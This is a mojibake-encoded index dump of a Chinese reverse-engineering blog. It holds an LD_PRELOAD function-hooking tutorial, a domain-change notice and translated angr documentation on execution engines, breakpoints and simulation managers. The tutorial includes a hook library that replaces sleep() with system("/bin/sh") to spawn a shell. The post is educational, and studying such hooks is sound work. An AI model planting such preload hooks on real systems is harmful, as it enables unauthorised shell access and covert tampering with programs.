","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:0","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"hookçš„åŸºæœ¬åŸç† ç¼–è¯‘å™¨åœ¨è¿›è¡Œé“¾æ¥æ—¶ï¼Œä¼šé¦–å…ˆåŠ è½½ç¯å¢ƒå˜é‡LD_PRELOADæ‰€æŒ‡å‘çš„åŠ¨æ€é“¾æ¥åº“ã€‚ç”±äºé“¾æ¥çš„å…·ä½“æ­¥éª¤ï¼ˆæ­¤å¤„ä¸èµ˜è¿°ï¼Œè¯¦æƒ…å¯æŸ¥é˜…csappæˆ–å…¶ä»–èµ„æ–™ï¼‰ï¼ŒåŒåçš„ç¬¦å·ä¸ä¼šè¢«é‡å¤åŠ è½½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå·±çš„åŠ¨æ€åº“â€œè¦†ç›–â€åŸæ¥ç¨‹åºä½¿ç”¨åŠ¨æ€åº“çš„ä¸€äº›ç¬¦å·ï¼Œè¾¾åˆ°hookçš„ç›®çš„ ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:1","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"é’ˆå¯¹ä¸Šè¿°åŠ è½½æ—¶é“¾æ¥çš„hook ç¼–å†™hook.cï¼ŒåŒ…å«åŒåå‡½æ•°funcï¼š #include \u003cstdio.h\u003e void func() { puts(\"func is hooked\"); } ç”ŸæˆåŠ¨æ€é“¾æ¥åº“hook.so gcc -fPIC --shared hook.c -o hook.so åŸæ¥ç”Ÿæˆçš„mainå¯æ‰§è¡Œæ–‡ä»¶ä¸å˜ï¼ˆç¯å¢ƒå˜é‡ä¹Ÿä¸å˜ï¼‰ï¼Œæ‰§è¡Œï¼š LD_PRELOAD=./hook.so ./main å¯ä»¥å‘ç°funcå‡½æ•°æ‰§è¡Œçš„æ˜¯lib.cä¸­çš„ä»£ç ï¼ŒhookæˆåŠŸ ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:2","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"æ— æ³•é’ˆå¯¹è¿è¡Œæ—¶é“¾æ¥è¿›è¡Œhook æ˜¾è€Œæ˜“è§çš„ï¼Œè¿è¡Œæ—¶é“¾æ¥æ˜¯æŒ‡å®šäº†æ–‡ä»¶è·¯å¾„ã€è·å–åˆ¶å®šæ–‡ä»¶ä¸­çš„ç¬¦å·ï¼Œæ•…æ— æ³•é€šè¿‡LD_PRELOADè¿›è¡Œhook ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:3","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"é’ˆå¯¹libcåº“ä¸­é»˜è®¤ç¬¦å·çš„hook æ˜ç™½äº†hookçš„åŸç†å¾ˆå®¹æ˜“å‘ç°ï¼Œæˆ‘ä»¬è‡ªå·±å†™çš„funcå‡½æ•°ä¸libcåº“ä¸­é»˜è®¤ç¬¦å·æ²¡æœ‰ä»€ä¹ˆæœ¬è´¨çš„åŒºåˆ«ï¼Œæ•…åªè¦å®šä¹‰åŒåçš„ç¬¦å·ï¼Œå°±å¯ä»¥å®ç°åŒæ ·çš„hook æ­¤å¤„ä»¥sleepå‡½æ•°ä¸ºä¾‹ï¼Œå…·ä½“è¿‡ç¨‹ä¸ä¸Šé¢æ— å¼‚ï¼Œä»…å±•ç¤ºä»£ç  main.c #include \u003cstdio.h\u003e int main() { puts(\"hello, my friend\"); sleep(3); puts(\"bye\"); return 0; } hook.c #include \u003cstdio.h\u003e void sleep() { puts(\"hacked by dx3906\"); } ç›´æ¥è¿è¡Œ./mainå’Œä½¿ç”¨ç¯å¢ƒå˜é‡LD_PRELOAD=./hook.so ./mainä¼šæœ‰æˆªç„¶ä¸åŒçš„æ•ˆæœ ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:4","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"é€šè¿‡hookåˆ°systemå‡½æ•°get shell è¿™é‡Œä»…ä»…æ˜¯å¯¹æ­¤hookæ‰‹æ®µç”¨é€”çš„ä¸€äº›ç•…æƒ³ï¼Œå®é™…ä¸Šæ‰€ç”¨æ–¹æ³•å®Œå…¨ä¸€è‡´ï¼Œè¿™ä¹Ÿæ˜¯LD_PRELOADè¿›è¡Œhookæå¤§çš„å±€é™æ€§ã€‚ åœ¨èƒ½å¤Ÿhookçš„æƒ…å†µä¸‹ï¼Œåªéœ€æŠŠhookå‡½æ•°çš„å†…å®¹å˜æˆsystemè°ƒç”¨å³å¯get shell å¦‚æŠŠä¸Šä¸ªä¾‹å­çš„hook.cæ”¹ä¸ºå¦‚ä¸‹ï¼š #include \u003cstdlib.h\u003e void sleep() { system(\"/bin/sh\"); } åŸç†å·²æ˜ï¼Œæ›´å¤šçš„ç”¨é€”è¯»è€…å¯ä»¥å°½æƒ…å‘æŒ¥æƒ³è±¡åŠ›ä¸åˆ›é€ åŠ› ä»¥ä¸Šï¼Œå¦‚æœ‰ç–æ¼è¯·å¸ˆå‚…ä»¬æŒ‡å‡ºã€‚ ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:5","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Life"],"content":"æ–°åŸŸåï¼šblog.dx39061.top åŸæ¥åŸŸåå¿«åˆ°æœŸäº†ï¼Œç»­è´¹åˆå¤ªè´µï¼Œæ‰€ä»¥æ¢äº†ä¸ªï¼Œåªæ˜¯åç¼€ä»xyzæ¢æˆäº†top åŸåŸŸåè§£æè¿˜åœ¨ä¸åœ¨äº†ï¼Œä½†ä½¿ç”¨åŸåŸŸåæ‰“å¼€ä¼šé‡åˆ°è¯ä¹¦é”™è¯¯é—®é¢˜. ","date":"2022-10-17","objectID":"/2022/10/%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D%E6%9B%B4%E6%8D%A2/:1:0","tags":["life"],"title":"åšå®¢åŸŸåæ›´æ¢","uri":"/2022/10/%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D%E6%9B%B4%E6%8D%A2/"},{"categories":["Angr"],"content":"Execution Engines å½“ä½ ä½¿ç”¨angrè¿›è¡Œå•æ­¥æ‰§è¡Œæ—¶ï¼ŒæŸäº›ä¸œè¥¿å®é™…åœ°è¿›è¡Œäº†æ‰§è¡Œï¼Œå³angrçš„ä¸€ç³»åˆ—å¼•æ“ï¼ˆSimEngineçš„å­ç±»ï¼‰ï¼Œå®ƒä»¬ä¼šæ¨¡æ‹Ÿç»™å®šä»£ç æ®µå¯¹è¾“å…¥çŠ¶æ€çš„å½±å“ã€‚angrçš„æ‰§è¡Œå†…æ ¸åªæ˜¯ä¾æ¬¡å°è¯•æ‰€æœ‰å¯ç”¨çš„å¼•æ“ï¼Œä½¿ç”¨ç¬¬ä¸€ä¸ªå¯ä»¥å¤„ç†è¯¥æ­¥éª¤çš„å¼•æ“ã€‚é»˜è®¤çš„å¼•æ“åˆ—è¡¨ï¼ŒæŒ‰é¡ºåºæ’åˆ—å¦‚ä¸‹ï¼š æ•…éšœå¼•æ“ï¼ˆfailuer engineï¼‰ï¼šå½“æŸä¸€æ­¥å¯¼è‡´ä¸€ä¸ªæ— æ³•ç»§ç»­çš„çŠ¶æ€æ—¶ï¼Œæ•…éšœå¼•æ“å¯åŠ¨ã€‚ ç³»ç»Ÿè°ƒç”¨å¼•æ“ï¼ˆsyscall engineï¼‰ï¼šå½“æŸä¸€éƒ¨äº§ç”Ÿç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œç³»ç»Ÿè°ƒç”¨å¼•æ“å¯åŠ¨ã€‚ hookå¼•æ“ï¼ˆhook engineï¼‰ï¼šå½“å½“å‰åœ°å€è¢«hookæ—¶å¯åŠ¨ unicornå¼•æ“ï¼ˆunicorn engineï¼‰ï¼šå½“UNICORNçŠ¶æ€é€‰é¡¹å¼€å¯å¹¶ä¸”çŠ¶æ€ä¸­æ— ç¬¦å·æ•°æ®æ—¶unicornå¼•æ“å¯åŠ¨ VEXå¼•æ“ï¼ˆVEX engineï¼‰ï¼šVEXå¼•æ“æ˜¯æœ€ç»ˆåå¤‡å¼•æ“ ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:0:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸ƒï¼‰Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"æ¨¡æ‹Ÿåç»§ï¼ˆSimSuccessorsï¼‰ å®é™…ä¸Šä¾æ¬¡å°è¯•æ‰€æœ‰å¯ç”¨å¼•æ“çš„å‡½æ•°æ˜¯project.factory.successprs(state, **kwargs)ï¼Œå®ƒå°†å‚æ•°ä¼ é€’ç»™æ¯ä¸ªå¼•æ“ã€‚è¿™ä¸ªå‡½æ•°æ˜¯state.step()å’Œsimulation_manager.step()çš„æ ¸å¿ƒï¼Œå®ƒè¿”å›ä¸€ä¸ªSimSuccessorså¯¹è±¡ã€‚è®¾è®¡SimSuccessorsçš„ç›®çš„æ˜¯å¯¹å­˜å‚¨åœ¨å„ç§åˆ—è¡¨å±æ€§ä¸­çš„åç»§çŠ¶æ€è¿›è¡Œç®€å•åˆ†ç±»ï¼Œå¦‚ä¸‹ï¼š ç±»åˆ«ï¼ˆAttributeï¼‰ è­¦æˆ’æ¡ä»¶ï¼ˆGuard Conditionï¼‰ å‘½ä»¤æŒ‡é’ˆï¼ˆInstruction Pointerï¼‰ æè¿°ï¼ˆDescriptionï¼‰ successors Trueï¼ˆå¯ä»¥è¢«ç¬¦å·åŒ–ï¼Œä½†è¢«é™åˆ¶ä¸ºTrueï¼‰ å¯ä»¥è¢«ç¬¦å·åŒ–ï¼ˆä½†æœ€å¤šæœ‰256ä¸ªsolutionï¼‰å‚é˜…unconstrained_successors å¼•æ“å¤„ç†æ­£å¸¸å¯æ»¡è¶³çš„çŠ¶æ€ï¼Œè¯¥çŠ¶æ€çš„æŒ‡ä»¤æŒ‡é’ˆå¯èƒ½æ˜¯ç¬¦å·åŒ–çš„ï¼ˆæ ¹æ®ç”¨æˆ·è¾“å…¥è¿›è¡Œè·³è½¬ï¼‰ï¼Œæ‰€ä»¥è¿™ä¸ªçŠ¶æ€å¯èƒ½ä»£è¡¨äº†å‡ ä¸ªæ½œåœ¨çš„åç»§çŠ¶æ€ unsat_successors Falseï¼ˆå¯ä»¥è¢«ç¬¦å·åŒ–ï¼Œä½†è¢«é™åˆ¶ä¸ºFalseï¼‰ å¯ä»¥è¢«ç¬¦å·åŒ– ä¸å¯æ»¡è¶³çš„åç»§çŠ¶æ€ï¼Œå®ƒçš„Guard Conditionåªèƒ½ä¸ºFlaseï¼ˆå³ä¸èƒ½è¿›è¡Œè·³è½¬æˆ–å¿…é¡»è¿›è¡Œé»˜è®¤åˆ†æ”¯è·³è½¬ï¼‰ flat_successors Trueï¼ˆå¯ä»¥è¢«ç¬¦å·åŒ–ï¼Œä½†è¢«é™åˆ¶ä¸ºTrueï¼‰ å…·ä½“çš„å€¼ å¦‚ä¸Šæ‰€è¿°ï¼Œåç»§åˆ—è¡¨ä¸­çš„çŠ¶æ€å¯ä»¥å…·æœ‰ç¬¦å·æŒ‡ä»¤æŒ‡é’ˆã€‚è¿™ä¸ªç†è§£èµ·æ¥ååˆ†å¤æ‚ï¼Œå’Œåœ¨å…¶ä»–åœ°æ–¹çš„ä»£ç ï¼ˆä¾‹å¦‚SimEngineVEX.processå½“å…¶ä¸­çŠ¶æ€å‘å‰æ‰§è¡Œæ—¶ï¼‰ï¼Œæˆ‘ä»¬å‡è®¾å•ä¸ªçŠ¶æ€ä»…ä»£è¡¨ä»£ç ä¸­å•ä¸ªç‚¹çš„æ‰§è¡Œã€‚ä¸ºäº†ä¾¿äºç†è§£ï¼Œå½“æˆ‘ä»¬é‡åˆ°å¸¦æœ‰ç¬¦å·æŒ‡ä»¤æŒ‡é’ˆçš„åç»§çŠ¶æ€æ—¶æˆ‘ä»¬ä¸ºå®ƒä»¬è®¡ç®—æ‰€æœ‰å¯èƒ½çš„solutionï¼Œå¹¶ä¸ºæ¯ä¸€ä¸ªè¿™æ ·çš„solutionåˆ¶ä½œä¸€ä»½çŠ¶æ€æ‹·è´ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªè¿‡ç¨‹ä¸ºæ‰å¹³åŒ–ã€‚è¿™äº›flat_successorsæ˜¯ä¸€äº›çŠ¶æ€ï¼Œå®ƒä»¬æ¯ä¸ªçŠ¶æ€éƒ½å¸¦æœ‰ä¸€ä¸ªä¸åŒçš„å…·ä½“å€¼çš„æŒ‡ä»¤æŒ‡é’ˆã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœåç»§çŠ¶æ€çš„æŒ‡ä»¤æŒ‡é’ˆæ˜¯X+5ï¼Œè€ŒXæœ‰X\u003e0x800000å’ŒX\u003c=0x800010çš„çº¦æŸã€‚æˆ‘ä»¬ä¼šå°†å…¶å±•å¹³ä¸º16ä¸ªä¸åŒçš„flat_successorsçŠ¶æ€ï¼ŒæŒ‡ä»¤æŒ‡é’ˆä»0x800006ä¸€ç›´åˆ°0x80015 unconstrained_successors Trueï¼ˆå¯ä»¥è¢«ç¬¦å·åŒ–ï¼Œä½†è¢«é™åˆ¶ä¸ºTrueï¼‰ ç¬¦å·åŒ–ï¼ˆè¶…è¿‡256ä¸ªsolutionï¼‰ åœ¨ä¸Šè¿°çš„æ‰å¹³åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæŒ‡ä»¤æŒ‡é’ˆæœ‰è¶…è¿‡256ç§å¯èƒ½çš„solutionï¼Œæˆ‘ä»¬å°±å‡è®¾è¯¥æŒ‡ä»¤åœ°å€å·²è¢«æ— çº¦æŸæ•°æ®è¦†ç›–ï¼ˆä¾‹å¦‚ç”¨æˆ·æ•°æ®çš„æ ˆæº¢å‡ºï¼‰ï¼Œè¿™ä¸ªæƒ…å†µä¸€èˆ¬æ˜¯ä¸åˆç†çš„ï¼Œè¿™äº›çŠ¶æ€è¢«æ”¾åœ¨unconstrained_successorsä¸­ï¼Œè€Œä¸æ˜¯åç»§çŠ¶æ€ä¸­ all_successors anything å¯ä»¥è¢«ç¬¦å·åŒ– ä¸Šè¿°ä¸‰ä¸ªsuccessorsçš„é›†åˆ ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:1:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸ƒï¼‰Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"æ–­ç‚¹ï¼ˆBreakpointsï¼‰ TODO: rewrite this to fix the narrative å’Œä»»ä½•ä¸€ä¸ªä¸é”™çš„æ‰§è¡Œå¼•æ“ä¸€æ ·ï¼Œangræ”¯æŒè®¾ç½®æ–­ç‚¹ã€‚è¿™å¾ˆé…·ï¼ä½ å¯ä»¥åƒä¸‹é¢è¿™æ ·è®¾ç½®æ–­ç‚¹ï¼š \u003e\u003e\u003e import angr \u003e\u003e\u003e b = angr.Project('examples/fauxware/fauxware') \u003e\u003e\u003e s = b.factory.entry_state() # æ·»åŠ ä¸€ä¸ªæ–­ç‚¹ï¼Œåœ¨å‘ç”Ÿå†…å­˜å†™å…¥ä¹‹å‰æ”¾å…¥ipdb \u003e\u003e\u003e s.inspect.b('mem_write') # æˆ–è€…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å†…å­˜å†™å…¥å‘ç”Ÿä¹‹åç«‹å³è§¦å‘æ–­ç‚¹ # æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿è¡Œä¸€ä¸ªå›è°ƒå‡½æ•°è€Œä¸æ˜¯æ‰“å¼€ipdb \u003e\u003e\u003e def debug_func(state): print(\"State %s is about to do a memory write!\") \u003e\u003e\u003e s.inspect.b('mem_write', when=angr.BP_AFTER, action=debug_func) # æˆ–è€…ï¼Œä½ å¯ä»¥æŠŠå®ƒæ”¾åˆ°ä½ çš„ipythonä¸­ \u003e\u003e\u003e s.inspect.b('mem_write', when=angr.BP_AFTER, action=angr.BP_IPYTHON) é™¤äº†å†…å­˜å†™å…¥ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šåœ°æ–¹å¯ä»¥è®¾ç½®æ–­ç‚¹ã€‚ä¸‹é¢å±•ç¤ºçš„æ˜¯ä¸ªå¯è®¾ç½®æ–­ç‚¹çš„äº‹ä»¶åˆ—è¡¨ï¼Œä½ éƒ½å¯ä»¥æŠŠä»–ä»¬è®¾ç½®ä¸ºBP_BEFOREæˆ–BP_AFTER Event type Event meaning mem_read å†…å­˜è¢«è¯»å–æ—¶ mem_write å†…å­˜è¢«å†™å…¥æ—¶ address_concretization æ­£åœ¨è§£æç¬¦å·åŒ–å†…å­˜è®¿é—® reg_read ä¸€ä¸ªå¯„å­˜å™¨è¢«è¯»å–æ—¶ reg_write ä¸€ä¸ªå¯„å­˜å™¨è¢«å†™å…¥æ—¶ tmp_read ä¸€ä¸ªä¸´æ—¶å˜é‡è¢«è¯»å–æ—¶ tmp_write ä¸€ä¸ªä¸´æ—¶å˜é‡è¢«å†™å…¥æ—¶ expr æ­£åœ¨åˆ›å»ºè¡¨è¾¾å¼ï¼ˆå³è·å¾—ç®—æœ¯è¿ç®—çš„ç»“æœæˆ–IRä¸­çš„å¸¸æ•°ï¼‰ statement æ­£åœ¨ç¿»è¯‘ä¸€ä¸ªIRå£°æ˜ï¼ˆstatementï¼‰ instruction æ­£åœ¨ç¿»è¯‘ä¸€æ¡æ–°çš„ï¼ˆæœ¬æœºï¼‰æŒ‡ä»¤ irsb æ­£åœ¨ç¿»è¯‘ä¸€ä¸ªåŸºæœ¬å— constraints æ–°çš„çº¦æŸè¢«æ·»åŠ åˆ°stateä¸­ exit æ­£åœ¨ä»æ‰§è¡Œä¸­ç”Ÿæˆåç»§çŠ¶æ€ fork ä¸€ä¸ªç¬¦å·æ‰§è¡ŒçŠ¶æ€åˆ†å‰æˆå¤šä¸ªçŠ¶æ€ symbolic_variable æ­£åœ¨åˆ›å»ºä¸€ä¸ªæ–°çš„ç¬¦å·å˜é‡ call æ­£åœ¨æ‰§è¡ŒcallæŒ‡ä»¤ return æ­£åœ¨æ‰§è¡ŒretæŒ‡ä»¤ simprocedure æ­£åœ¨æ‰§è¡Œsimprocedureï¼ˆæˆ–syscallï¼‰ dirty æ­£åœ¨æ‰§è¡Œdirty IR callback syscall syscallè¢«æ‰§è¡Œï¼ˆé™¤äº†simprocedureäº‹ä»¶ä¹‹å¤–çš„è°ƒç”¨ï¼‰ engine_process SimEngineå³å°†å¤„ç†ä¸€äº›ä»£ç  è¿™äº›äº‹ä»¶æ‹¥æœ‰ä¸åŒçš„å±æ€§ï¼š ï¼ˆè¡¨æ ¼å¤ªé•¿ä¸æ¬äº†ï¼‰é“¾æ¥ï¼šhttps://docs.angr.io/core-concepts/simulation è¿™äº›å±æ€§å¯ä»¥åœ¨é€‚å½“çš„æ–­ç‚¹å›è°ƒæœŸé—´ä½œä¸ºstate.inspectçš„æˆå‘˜è®¿é—®ï¼Œä»¥è·å–é€‚å½“çš„å€¼ã€‚ä½ ç”šè‡³å¯ä»¥ä¿®æ”¹è¿™äº›å€¼æ¥ä¸ºä½ æ‰€ç”¨ \u003e\u003e\u003e def track_reads(state): ... print('Read', state.inspect.mem_read_expr, 'from', state.inspect.mem_read_address) ... \u003e\u003e\u003e s.inspect.b('mem_read', when=angr.BP_AFTER, action=track_reads) æ­¤å¤–ï¼Œè¿™äº›å±æ€§éƒ½å¯ä»¥ä½œä¸ºinspect.bçš„å‚æ•°ï¼Œä½¿æ–­ç‚¹è¢«æ¡ä»¶çº¦æŸï¼š # å¦‚æœ0x1000æ˜¯ç›®æ ‡è¡¨è¾¾å¼çš„å¯èƒ½å€¼ï¼Œåˆ™å°†ä¼šåœ¨å†…å­˜å†™å…¥ä¹‹å‰è§¦å‘æ–­ç‚¹ \u003e\u003e\u003e s.inspect.b('mem_write', mem_write_address=0x1000) # å¦‚æœ0x1000æ˜¯ç›®æ ‡è¡¨è¾¾å¼çš„å”¯ä¸€å¯èƒ½å€¼ï¼Œåˆ™å°†åœ¨å†…å­˜å†™å…¥ä¹‹å‰è§¦å‘æ–­ç‚¹ \u003e\u003e\u003e s.inspect.b('mem_write', mem_write_address=0x1000, mem_write_address_unique=True) # è‹¥0x1000æ˜¯ä»å†…å­˜ä¸­è¯»å–çš„æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å¯èƒ½å€¼ï¼Œåˆ™ä¼šåœ¨0x8000æŒ‡ä»¤ä¹‹åè§¦å‘æ–­ç‚¹ \u003e\u003e\u003e s.inspect.b('instruction', when=angr.BP_AFTER, instruction=0x8000, mem_read_expr=0x1000) äº‹å®ä¸Šï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥æŒ‡å®šä¸€ä¸ªå‡½æ•°ä½œä¸ºæ¡ä»¶ # è¿™æ˜¯ä¸€ä¸ªå¤æ‚æ¡ä»¶ï¼Œå®ƒç¡®ä¿RAXä¸º0x41414141å¹¶ä¸”ä»0x8004å¼€å§‹çš„åŸºæœ¬å—åœ¨æ­¤è·¯å¾„ä¹‹å‰çš„æŸä¸ªæ—¶é—´æ‰§è¡Œ \u003e\u003e\u003e def cond(state): ... return state.eval(state.regs.rax, cast_to=str) == 'AAAA' and 0x8004 in state.inspect.backtrace \u003e\u003e\u003e s.inspect.b('mem_write', condition=cond) ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:2:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸ƒï¼‰Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"å…³äºä½¿ç”¨mem_readæ–­ç‚¹çš„æ³¨æ„äº‹é¡¹ æ¯å½“ç¨‹åºè¯»å–å†…å­˜æ—¶ï¼Œå°±ä¼šè§¦å‘mem_readæ–­ç‚¹ã€‚å¦‚æœåœ¨è®¾ç½®è¿™ç§æ–­ç‚¹çš„åŒæ—¶è¿˜ä½¿ç”¨state.memä»å†…å­˜åœ°å€åŠ è½½æ•°æ®ï¼Œé‚£ä¹ˆæ–­ç‚¹ä¹Ÿå°†è¢«è§¦å‘ å› æ­¤ï¼Œå¦‚æœä½ æƒ³ä»å†…å­˜ä¸­åŠ è½½æ•°æ®è€Œä¸è§¦å‘mem_readæ–­ç‚¹ï¼Œè¯·ä½¿ç”¨state.memory.loadæºå¸¦å…³é”®è¯å‚æ•°disabl_actions=Trueå’Œinspect=False å¯¹äºstate.findæ–¹æ³•ä¹ŸåŒä¸Š ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:3:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸ƒï¼‰Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"Simulation Managers Simulation Manageræ˜¯angrä¸­æœ€é‡è¦çš„æ§åˆ¶æ¨¡å—ï¼Œå®ƒè®©ä½ èƒ½å¤Ÿæ§åˆ¶ä¸åŒçŠ¶æ€çš„ç¬¦å·æ‰§è¡Œï¼Œä½¿ç”¨æœç´¢ç­–ç•¥æ¥æ¢ç´¢ç¨‹åºçš„çŠ¶æ€ç©ºé—´ã€‚åœ¨è¿™ä¸€èŠ‚ä¸­ï¼Œä½ å°†å­¦ä¼šå¦‚ä½•ä½¿ç”¨å®ƒã€‚ Simulation Managerè®©ä½ ä»¥ä¸€ç§å·§å¦™çš„æ–¹å¼å¤„ç†å¤šä¸ªçŠ¶æ€ã€‚å¤šç§çŠ¶æ€ç»„æˆâ€œå­˜å‚¨åŒºï¼ˆstashesï¼‰â€ï¼Œä½ å¯ä»¥ä»»æ„å‰è¿›ã€è¿‡æ»¤ã€åˆå¹¶å’Œç§»åŠ¨ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä»¥ä¸åŒé€Ÿç‡æ­¥è¿›ä¸¤ä¸ªä¸åŒçš„å­˜å‚¨åŒºï¼Œç„¶åå°†å®ƒä»¬åˆå¹¶åœ¨ä¸€èµ·ã€‚å¤§å¤šæ•°æ“ä½œçš„é»˜è®¤å­˜å‚¨åŒºæ˜¯activeå­˜å‚¨åŒºï¼Œå½“ä½ åˆå§‹åŒ–simlation manageræ—¶ï¼ŒçŠ¶æ€å°±æ”¾åœ¨é‡Œé¢ã€‚ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:0:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå…­ï¼‰Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"å•æ­¥æ‰§è¡Œï¼ˆSteppingï¼‰ simulation manageræœ€åŸºç¡€çš„åŠŸèƒ½æ˜¯é€šè¿‡.step()å°†é»˜è®¤å­˜å‚¨åŒºçš„æ‰€æœ‰çŠ¶æ€å‘å‰æ¨è¿›ä¸€ä¸ªåŸºæœ¬å—ã€‚ \u003e\u003e\u003e import angr \u003e\u003e\u003e proj = angr.Project('examples/fauxware/fauxware', auto_load_libs=False) \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e simgr = proj.factory.simgr(state) \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x400580\u003e] \u003e\u003e\u003e simgr.step() \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x400540\u003e] å½“ç„¶ï¼Œå­˜å‚¨åŒºæ¨¡å‹çœŸæ­£çš„å¨åŠ›åœ¨äºï¼Œå½“ä¸€ä¸ªçŠ¶æ€é‡åˆ°ç¬¦å·åˆ†æ”¯æ¡ä»¶æ—¶ï¼Œä¸¤ä¸ªåç»§çŠ¶æ€éƒ½ä¼šå‡ºç°åœ¨å­˜å‚¨åŒºä¸­ï¼Œç„¶åä½ å¯ä»¥åŒæ­¥æ‰§è¡Œä¸¤ä¸ªåˆ†æ”¯ã€‚å½“ä½ 